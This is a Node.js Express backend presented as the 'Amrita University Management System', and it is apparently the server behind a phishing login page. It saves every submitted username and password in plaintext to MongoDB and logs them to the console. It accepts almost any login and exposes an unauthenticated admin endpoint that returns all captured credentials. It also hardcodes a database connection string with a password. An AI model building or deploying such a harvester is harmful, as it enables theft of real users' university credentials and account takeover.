const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');

const app = express();
const PORT = 3000;

// Connect to MongoDB
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://Chethan=MyPassword123@cluster0.fiyebyi.mongodb.net/aums?appName=Cluster0';
const LOCAL_URI = 'mongodb://127.0.0.1:27017/aums';

async function connectDB() {
    try {
        console.log('Connecting to MongoDB Atlas...');
        await mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 5000 });
        console.log('Connected to MongoDB Atlas successfully.');
    } catch (err) {
        console.error('MongoDB Atlas connection error:', err.message);
        console.log('Attempting local MongoDB fallback...');
        try {
            await mongoose.disconnect();
            await mongoose.connect(LOCAL_URI);
            console.log('Connected to local fallback MongoDB successfully.');
        } catch (localErr) {
            console.error('Local fallback MongoDB connection error:', localErr.message);
        }
    }
}

connectDB();

// Define Credential Schema & Model
const CredentialSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true },
    timestamp: { type: Date, default: Date.now }
});

const Credential = mongoose.model('Credential', CredentialSchema);

// Enable CORS so the static frontend can communicate with the backend
app.use(cors());

// Parse JSON request bodies
app.use(express.json());

// Serve static frontend files from the same directory
app.use(express.static(__dirname));

// Login API endpoint
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    console.log(`[LOGIN TRY] Username: "${username}", Password: "${password}"`);

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Username and password are required.'
        });
    }

    try {
        // Save user's typed credentials to MongoDB
        await Credential.create({ username, password });
        console.log(`[DATABASE SAVED] Captured credentials for user: "${username}"`);
    } catch (err) {
        console.error('[DATABASE ERROR] Failed to save credential:', err);
    }

    // Mock authentication:
    // If username or password contains 'error' (case-insensitive), simulate failure.
    if (username.toLowerCase().includes('error') || password.toLowerCase().includes('error')) {
        return res.status(401).json({
            success: false,
            message: 'Authentication failed: Invalid credentials or account locked.'
        });
    }

    return res.status(200).json({
        success: true,
        message: 'Login recorded successfully.'
    });
});
// Admin API endpoint to retrieve all credentials
app.get('/api/admin/credentials', async (req, res) => {
    try {
        const credentials = await Credential.find().sort({ timestamp: -1 });
        return res.status(200).json({
            success: true,
            data: credentials
        });
    } catch (err) {
        console.error('[DATABASE ERROR] Failed to fetch credentials:', err);
        return res.status(500).json({
            success: false,
            message: 'Failed to retrieve credentials from the database.'
        });
    }
});


if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`==================================================`);
        console.log(` Amrita University Management System Backend      `);
        console.log(` Running locally at: http://localhost:${PORT}      `);
        console.log(`==================================================`);
    });
}

module.exports = app;
